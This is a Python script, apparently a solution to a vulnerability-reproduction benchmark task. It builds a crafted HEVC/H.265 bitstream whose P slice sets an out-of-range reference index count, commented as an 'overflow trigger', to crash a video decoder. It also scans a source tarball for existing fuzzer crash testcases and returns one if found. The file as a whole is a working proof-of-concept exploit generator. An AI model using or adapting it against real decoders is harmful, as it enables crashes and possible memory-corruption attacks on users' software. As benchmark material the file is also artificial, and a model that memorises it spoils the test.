import os
import re
import tarfile
from typing import Optional, Tuple


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0  # bits used in _cur (0..7)

    def write_bit(self, b: int):
        b &= 1
        if self._nbits == 0:
            self._buf.append(0)
        idx = len(self._buf) - 1
        self._buf[idx] |= b << (7 - self._nbits)
        self._nbits = (self._nbits + 1) & 7

    def write_bits(self, v: int, n: int):
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, x: int):
        if x < 0:
            x = 0
        code_num = x + 1
        k = code_num.bit_length() - 1
        for _ in range(k):
            self.write_bit(0)
        self.write_bit(1)
        info = code_num - (1 << k)
        self.write_bits(info, k)

    def write_se(self, x: int):
        if x > 0:
            code_num = 2 * x - 1
        else:
            code_num = -2 * x
        self.write_ue(code_num)

    def rbsp_trailing_bits(self):
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        return bytes(self._buf)


def _emulation_prevention(rbsp: bytes) -> bytes:
    out = bytearray()
    z = 0
    for b in rbsp:
        if z >= 2 and b <= 3:
            out.append(3)
            z = 0
        out.append(b)
        if b == 0:
            z += 1
        else:
            z = 0
    return bytes(out)


def _nal_header(nal_unit_type: int, layer_id: int = 0, tid_plus1: int = 1) -> bytes:
    v = ((nal_unit_type & 0x3F) << 9) | ((layer_id & 0x3F) << 3) | (tid_plus1 & 0x7)
    return bytes([(v >> 8) & 0xFF, v & 0xFF])


def _annexb_nal(nal_unit_type: int, rbsp: bytes) -> bytes:
    ebsp = _emulation_prevention(rbsp)
    return b"\x00\x00\x00\x01" + _nal_header(nal_unit_type) + ebsp


def _write_profile_tier_level(bw: _BitWriter, max_sub_layers_minus1: int):
    bw.write_bits(0, 2)  # general_profile_space
    bw.write_bit(0)      # general_tier_flag
    bw.write_bits(1, 5)  # general_profile_idc (Main)
    for i in range(32):
        bw.write_bit(1 if i == 1 else 0)  # general_profile_compatibility_flag[i]
    bw.write_bit(1)  # general_progressive_source_flag
    bw.write_bit(0)  # general_interlaced_source_flag
    bw.write_bit(0)  # general_non_packed_constraint_flag
    bw.write_bit(1)  # general_frame_only_constraint_flag
    bw.write_bits(0, 44)  # general_reserved_zero_44bits
    bw.write_bits(120, 8)  # general_level_idc

    if max_sub_layers_minus1 > 0:
        sub_layer_profile_present = [0] * max_sub_layers_minus1
        sub_layer_level_present = [0] * max_sub_layers_minus1
        for i in range(max_sub_layers_minus1):
            bw.write_bit(sub_layer_profile_present[i])
            bw.write_bit(sub_layer_level_present[i])
        if max_sub_layers_minus1 > 0:
            for _ in range(8 - max_sub_layers_minus1):
                bw.write_bits(0, 2)  # reserved_zero_2bits
        for i in range(max_sub_layers_minus1):
            if sub_layer_profile_present[i]:
                bw.write_bits(0, 2)
                bw.write_bit(0)
                bw.write_bits(1, 5)
                for _ in range(32):
                    bw.write_bit(0)
                bw.write_bit(0)
                bw.write_bit(0)
                bw.write_bit(0)
                bw.write_bit(0)
                bw.write_bits(0, 44)
            if sub_layer_level_present[i]:
                bw.write_bits(0, 8)


def _make_vps() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bits(3, 2)  # vps_reserved_three_2bits
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _write_profile_tier_level(bw, 0)
    bw.write_bit(0)   # vps_sub_layer_ordering_info_present_flag
    bw.write_ue(5)    # vps_max_dec_pic_buffering_minus1[0] (=> 6)
    bw.write_ue(0)    # vps_max_num_reorder_pics[0]
    bw.write_ue(0)    # vps_max_latency_increase_plus1[0]
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1
    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag
    bw.rbsp_trailing_bits()
    return _annexb_nal(32, bw.get_bytes())


def _make_sps() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    _write_profile_tier_level(bw, 0)

    bw.write_ue(0)   # sps_seq_parameter_set_id
    bw.write_ue(1)   # chroma_format_idc
    bw.write_ue(64)  # pic_width_in_luma_samples
    bw.write_ue(64)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag

    bw.write_ue(0)  # bit_depth_luma_minus8
    bw.write_ue(0)  # bit_depth_chroma_minus8
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)

    bw.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(5)   # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)   # sps_max_num_reorder_pics[0]
    bw.write_ue(0)   # sps_max_latency_increase_plus1[0]

    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra

    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag

    bw.write_ue(0)  # num_short_term_ref_pic_sets

    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag

    bw.rbsp_trailing_bits()
    return _annexb_nal(33, bw.get_bytes())


def _make_pps() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)   # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)   # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)   # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)   # pps_cb_qp_offset
    bw.write_se(0)   # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)   # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return _annexb_nal(34, bw.get_bytes())


def _make_idr_slice() -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_bit(0)  # no_output_of_prior_pics_flag (IDR)
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(2)   # slice_type (I)
    bw.write_se(0)   # slice_qp_delta
    bw.rbsp_trailing_bits()
    return _annexb_nal(19, bw.get_bytes())  # IDR_W_RADL


def _make_p_slice_overflow(num_ref_idx_l0_active_minus1: int = 31) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(1)   # slice_type (P)
    bw.write_bits(1, 4)  # slice_pic_order_cnt_lsb (4 bits)

    bw.write_bit(0)  # short_term_ref_pic_set_sps_flag
    bw.write_ue(1)   # num_negative_pics
    bw.write_ue(0)   # num_positive_pics
    bw.write_ue(0)   # delta_poc_s0_minus1 (=> delta = 1)
    bw.write_bit(1)  # used_by_curr_pic_s0_flag

    bw.write_bit(1)  # num_ref_idx_active_override_flag
    bw.write_ue(num_ref_idx_l0_active_minus1)  # overflow trigger

    bw.write_ue(0)  # five_minus_max_num_merge_cand
    bw.write_se(0)  # slice_qp_delta

    for _ in range(64):  # extra padding bits
        bw.write_bit(0)

    bw.rbsp_trailing_bits()
    return _annexb_nal(1, bw.get_bytes())  # TRAIL_R


def _try_find_embedded_poc_in_tar(src_path: str) -> Optional[bytes]:
    if not os.path.isfile(src_path):
        return None
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return None

    keyword_re = re.compile(r"(42537907|clusterfuzz|testcase|crash|poc|hevc|h265|hvc|mp4|annexb|nal)", re.I)

    best: Tuple[int, Optional[bytes]] = (-1, None)
    try:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > 200000:
                continue
            name = m.name
            base = os.path.basename(name)
            score = 0
            if keyword_re.search(name):
                score += 50
            if base.endswith((".bin", ".raw", ".h265", ".hevc", ".hvc", ".mp4", ".m4v", ".dat")):
                score += 30
            if 200 <= m.size <= 5000:
                score += 10
            elif 1 <= m.size <= 200:
                score += 5

            f = tf.extractfile(m)
            if not f:
                continue
            data = f.read()
            if not data:
                continue
            if b"\x00\x00\x00\x01" in data or b"\x00\x00\x01" in data:
                score += 15
            if data[:4] == b"ftyp" or (len(data) >= 8 and data[4:8] == b"ftyp"):
                score += 15

            if score > best[0]:
                best = (score, data)
    finally:
        try:
            tf.close()
        except Exception:
            pass

    return best[1] if best[0] >= 80 else None


class Solution:
    def solve(self, src_path: str) -> bytes:
        embedded = _try_find_embedded_poc_in_tar(src_path)
        if embedded is not None:
            return embedded

        stream = bytearray()
        stream += _make_vps()
        stream += _make_sps()
        stream += _make_pps()
        stream += _make_idr_slice()
        stream += _make_p_slice_overflow(31)
        return bytes(stream)